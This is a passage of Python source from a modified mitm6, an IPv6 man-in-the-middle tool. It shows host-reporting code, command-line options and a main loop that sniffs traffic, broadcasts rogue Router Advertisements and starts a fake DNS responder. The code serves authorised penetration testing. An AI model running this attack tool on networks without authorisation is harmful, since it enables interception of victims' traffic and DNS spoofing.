        if prefix_addresses:
            prefix_hosts.append((mac, target, prefix_addresses))
        
        # Track link-local addresses
        if hasattr(target, 'ipv6_link_local') and target.ipv6_link_local:
            link_local_hosts.append((mac, target, target.ipv6_link_local))
    
    # Add mitm6 host to link-local addresses table if it has a link-local address
    try:
        self_ipv6 = ipaddress.IPv6Address(config.selfaddr)
        if self_ipv6.is_link_local:
            # Create a target entry for the mitm6 host if it doesn't exist
            if config.selfmac not in pcdict:
                pcdict[config.selfmac] = Target(config.selfmac, '')
            mitm6_target = pcdict[config.selfmac]
            if str(config.selfaddr) not in mitm6_target.ipv6_link_local:
                mitm6_target.ipv6_link_local.add(str(config.selfaddr))
            # Add to link_local_hosts if not already there
            mitm6_found = False
            for mac, target, addrs in link_local_hosts:
                if mac == config.selfmac:
                    mitm6_found = True
                    break
            if not mitm6_found:
                link_local_hosts.append((config.selfmac, mitm6_target, mitm6_target.ipv6_link_local))
    except (ipaddress.AddressValueError, ValueError, AttributeError):
        pass
    
    # Prepare output content
    output_lines = []
    
    # Report hosts in our prefix
    if prefix_hosts:
        print('')
        print('=== Hosts in Advertised Prefix (%s/64) ===' % config.ipv6prefix)
        output_lines.append('=== Hosts in Advertised Prefix (%s/64) ===' % config.ipv6prefix)
        
        # Calculate column widths for proper alignment
        mac_width = 20
        ipv6_width = 39  # Increased to accommodate longer IPv6 addresses
        assignment_width = 15
        link_local_width = 25
        
        # Create header with proper spacing
        header = '%-*s | %-*s | %-*s | %s' % (mac_width, 'MAC Address', ipv6_width, 'IPv6 Address', assignment_width, 'Assignment Type', 'Link-Local Address')
        separator = '-' * (mac_width + ipv6_width + assignment_width + link_local_width + 9)  # +9 for pipes and spaces
        
        print(header)
        print(separator)
        output_lines.append(header)
        output_lines.append(separator)
        
        for mac, target, prefix_addresses in prefix_hosts:
            hostname = target.host if target.host else 'Unknown'
            
            # Format link-local addresses
            link_local_str = 'N/A'
            if hasattr(target, 'ipv6_link_local') and target.ipv6_link_local:
                link_local_str = ', '.join(sorted(target.ipv6_link_local))
            
            # Display each address on a separate line
            first_line = True
            for addr, assignment_type in sorted(prefix_addresses):
                if first_line:
                    line = '%-*s | %-*s | %-*s | %s' % (mac_width, mac, ipv6_width, addr, assignment_width, assignment_type, link_local_str)
                    print(line)
                    output_lines.append(line)
                    first_line = False
                else:
                    line = '%-*s | %-*s | %-*s | %s' % (mac_width, '', ipv6_width, addr, assignment_width, assignment_type, '')
                    print(line)
                    output_lines.append(line)
        
        print(separator)
        output_lines.append(separator)
        print('Total: %d hosts' % len(prefix_hosts))
        output_lines.append('Total: %d hosts' % len(prefix_hosts))
    else:
        print('')
        print('No hosts detected with addresses in advertised prefix %s/64' % config.ipv6prefix)
        output_lines.append('')
        output_lines.append('No hosts detected with addresses in advertised prefix %s/64' % config.ipv6prefix)
    
    # Report all link-local addresses
    if link_local_hosts:
        print('')
        print('=== All Link-Local Addresses ===')
        output_lines.append('')
        output_lines.append('=== All Link-Local Addresses ===')
        
        # Calculate column widths for proper alignment
        mac_width = 20
        link_local_width = 25
        hostname_width = 20
        
        # Create header with proper spacing
        header = '%-*s | %-*s | %s' % (mac_width, 'MAC Address', link_local_width, 'Link-Local Address', 'Hostname')
        separator = '-' * (mac_width + link_local_width + hostname_width + 6)  # +6 for pipes and spaces
        
        print(header)
        print(separator)
        output_lines.append(header)
        output_lines.append(separator)
        
        for mac, target, link_local_addrs in link_local_hosts:
            # Check if this is the mitm6 host
            if mac == config.selfmac:
                # Get system hostname for mitm6 host
                try:
                    system_hostname = socket.gethostname()
                    hostname = '%s (mitm6 host)' % system_hostname
                except:
                    hostname = 'mitm6 host'
            else:
                hostname = target.host if target.host else 'Unknown'
            
            # Display each link-local address on a separate line
            first_line = True
            for link_local in sorted(link_local_addrs):
                if first_line:
                    line = '%-*s | %-*s | %s' % (mac_width, mac, link_local_width, link_local, hostname)
                    print(line)
                    output_lines.append(line)
                    first_line = False
                else:
                    line = '%-*s | %-*s | %s' % (mac_width, '', link_local_width, link_local, '')
                    print(line)
                    output_lines.append(line)
        
        print(separator)
        output_lines.append(separator)
        print('Total: %d hosts with link-local addresses' % len(link_local_hosts))
        output_lines.append('Total: %d hosts with link-local addresses' % len(link_local_hosts))
    else:
        print('')
        print('No link-local addresses detected')
        output_lines.append('')
        output_lines.append('No link-local addresses detected')
    
    # Save to output file if specified
    if hasattr(config, 'output_file') and config.output_file:
        try:
            with open(config.output_file, 'w') as f:
                f.write('\n'.join(output_lines))
            print('')
            print('IPv6 host information saved to: %s' % config.output_file)
        except IOError as e:
            print('')
            print('Error saving to output file %s: %s' % (config.output_file, e))

def shutdownnotice():
    print('')
    print('Shutting down packet capture after next packet...')
    # Report IPv6 hosts before shutdown
    report_ipv6_hosts()
    # print(pcdict)
    # print(arptable)
    with open('arp.cache','w') as arpcache:
        arpcache.write(json.dumps(arptable))

def print_err(failure):
    print('An error occurred while sending a packet: %s\nNote that root privileges are required to run mitm6' % failure.getErrorMessage())

def main():
    global config
    parser = argparse.ArgumentParser(description='mitm6 v0.4.0 - pwning legacy networks using IPv6\nFor help or reporting issues, visit https://github.com/fox-it/mitm6', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-i", "--interface", type=str, metavar='INTERFACE', help="Interface to use (default: autodetect)")
    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain (default: use first DNS domain)")
    parser.add_argument("-4", "--ipv4", type=str, metavar='ADDRESS', help="IPv4 address to send packets from (default: autodetect)")
    parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
    parser.add_argument("--ipv6-prefix", type=str, metavar='PREFIX', help="IPv6 prefix to advertise (default: calculated from interface IPv6 address)")
    parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
    parser.add_argument("-a", "--no-ra", action='store_true', help="Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)")
    parser.add_argument("--no-managed", action='store_true', help="Disable the managed flag in Router Advertisements (clients will not use DHCPv6)")
    parser.add_argument("--no-other", action='store_true', help="Disable the other flag in Router Advertisements (clients will not request additional configuration)")
    parser.add_argument("--disable-dhcpv6", action='store_true', help="Disable DHCPv6 server functionality and only rely on SLAAC")
    parser.add_argument("--delegation-prefix", type=str, metavar='PREFIX', help="IPv6 prefix to delegate from (default: 2001:db8:123::/48)")
    parser.add_argument("--ignore-existing-v6-risk-dos", action='store_true', help="Ignore existing IPv6 router detection and continue anyway")
    parser.add_argument("--show-traffic", action='store_true', help="Show detailed traffic analysis including TCP SYN and non-TCP traffic")
    parser.add_argument("--include-legacy", action='store_true', help="Include IPv4 legacy traffic analysis in addition to IPv6")
    parser.add_argument("--enable-pref64", action='store_true', help="Enable PREF64 flag in Router Advertisements for NAT64 support")
    parser.add_argument("--nat64-prefix", type=str, metavar='PREFIX', help="NAT64 prefix to announce (default: 64:ff9b::/96)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
    parser.add_argument("--debug", action='store_true', help="Show debug information")
    parser.add_argument("-o", "--output", type=str, metavar='FILE', help="Save IPv6 host information to output file")

    filtergroup = parser.add_argument_group("Filtering options")
    filtergroup.add_argument("-d", "--domain", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.)")
    filtergroup.add_argument("-b", "--blacklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blacklist principle, multiple can be specified.)")
    filtergroup.add_argument("-hw", "--host-whitelist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Whitelist principle, multiple can be specified.)")
    filtergroup.add_argument("-hb", "--host-blacklist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Blacklist principle, multiple can be specified.)")
    filtergroup.add_argument("--ignore-nofqdn", action='store_true', help="Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.")

    args = parser.parse_args()
    config = Config(args)

    print('Starting mitm6 using the following configuration:')
    print('Primary adapter: %s [%s]' % (config.default_if, config.selfmac))
    print('IPv4 address: %s' % config.selfipv4)
    print('IPv6 address: %s (%s)' % (config.selfaddr, config.v6addr_type))
    print('IPv6 prefix: %s' % config.ipv6prefix)
    # Calculate actual RA flags that will be sent
    if config.disable_dhcpv6:
        ra_m_flag = 0
        ra_o_flag = 0
    else:
        ra_m_flag = 0 if config.no_managed else 1
        ra_o_flag = 0 if config.no_other else 1
    print('Router Advertisement flags: M=%s, O=%s' % (ra_m_flag, ra_o_flag))
    if config.disable_dhcpv6:
        print('DHCPv6 server: DISABLED (SLAAC only mode)')
    else:
        print('DHCPv6 server: ENABLED')
    if config.enable_pref64:
        print('PREF64 (NAT64): ENABLED - prefix: %s' % config.nat64_prefix)
    print('Delegation prefix pool: %s' % config.delegation_prefix)
    if config.show_traffic:
        if config.include_legacy:
            print('Traffic analysis: ENABLED (showing IPv4+IPv6 TCP SYN, non-TCP, and routing analysis)')
        else:
            print('Traffic analysis: ENABLED (showing IPv6 TCP SYN, non-TCP, and routing analysis)')
    if config.localdomain is not None:
        print('DNS local search domain: %s' % config.localdomain)
    if not config.dns_whitelist and not config.dns_blacklist:
        print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify at least one domain with -d')
    else:
        if not config.dns_whitelist:
            print('DNS whitelist: *')
        else:
            print('DNS whitelist: %s' % ', '.join(config.dns_whitelist))
        if config.dns_blacklist:
            print('DNS blacklist: %s' % ', '.join(config.dns_blacklist))
    if config.host_whitelist:
        print('Hostname whitelist: %s' % ', '.join(config.host_whitelist))
    if config.host_blacklist:
        print('Hostname blacklist: %s' % ', '.join(config.host_blacklist))

    # Check for existing IPv6 routers (always perform detection)
    existing_routers_detected = check_existing_ipv6_router()
    
    if existing_routers_detected:
        if config.ignore_existing_v6_risk_dos:
            print('WARNING: Existing IPv6 routers detected, but continuing due to --ignore-existing-v6-risk-dos flag.')
            print('You are proceeding at your own risk. Network conflicts may occur.')
        else:
            print('Aborting due to existing IPv6 router detection.')
            print('Use --ignore-existing-v6-risk-dos to override this check and continue anyway.')
            sys.exit(1)

    # Join IPv6 multicast groups (only if we're proceeding)
    join_multicast_groups()

    #Main packet capture thread
    if config.show_traffic:
        if config.include_legacy:
            # Capture both IPv4 and IPv6 traffic for comprehensive analysis
            capture_filter = "ip or ip6"
        else:
            # Capture all IPv6 traffic for detailed analysis
            capture_filter = "ip6"
    else:
        # Original filter for basic functionality
        capture_filter = "ip6 proto \\udp or arp or udp port 53 or icmp6"
    
    d = threads.deferToThread(sniff, iface=config.default_if, filter=capture_filter, prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
    d.addErrback(print_err)

    #RA loop
    if not config.no_ra:
        loop = task.LoopingCall(send_ra)
        d = loop.start(30.0)
        d.addErrback(print_err)
    
    # Periodic IPv6 host reporting (every 60 seconds, starting after first interval)
    def periodic_ipv6_report():
        report_ipv6_hosts()
    
    ipv6_loop = task.LoopingCall(periodic_ipv6_report)
    ipv6_loop.start(60.0, now=False)  # Start after first interval, not immediately
    print('IPv6 host reporting: First report will be shown in 60 seconds')

    # Set up DNS
    dnssock = setupFakeDns()
    reactor.adoptDatagramPort(dnssock.fileno(), socket.AF_INET6, DatagramProtocol())

    reactor.addSystemEventTrigger('before', 'shutdown', shutdownnotice)
    reactor.run()

if __name__ == '__main__':
    main()
